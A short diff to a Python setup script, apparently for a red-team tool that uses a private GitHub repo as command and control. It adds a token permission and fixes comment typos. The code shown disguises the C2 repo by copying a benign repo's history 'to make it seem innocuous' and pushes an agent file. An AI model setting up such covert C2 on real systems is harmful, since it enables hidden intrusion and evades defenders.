@@ -144,6 +144,7 @@ Perform the following steps to create a GitHub personal access token:
 3. Click on "Personal access tokens" under Developer settings on the left.
 4. Give the token a description and the following permissions:
    - The top-level checkbox for "repo"
+   - The top-level checkbox for "admin:repo_hook"
    - "gist"
    - "delete_repo"
 5. Click the "Generate token" button.
@@ -208,7 +209,7 @@ copy somewhere safe if you want to re-run this script later.
     return config
 
 # Sync the history of the newly created private GitHub repo used for command and control
-# with the history of the benign repo, to make it seem innocous on disk.
+# with the history of the benign repo, to make it seem innocuous on disk.
 def sync_c2_history(config):
     print("[*] Syncing the benign git repo's history to the newly created repo")
     orig_dir = os.path.abspath(os.curdir)
@@ -389,7 +390,7 @@ def _add_file_to_c2_repo(config, template_file_path, params, dest_path_in_c2_rep
     # cd into cloned git repo to do git munging there
     os.chdir(config["benign_repo_path"])
 
-    # Add agent.pu and push
+    # Add agent.py and push
     subprocess.check_output("git add %s" % dest_path_in_c2_repo, shell=True)
     subprocess.check_output("git commit -m 'Add %s'" % dest_path_in_c2_repo, shell=True)
     subprocess.check_output("git push --repo %s" % config["primary_clone_url"], shell=True)
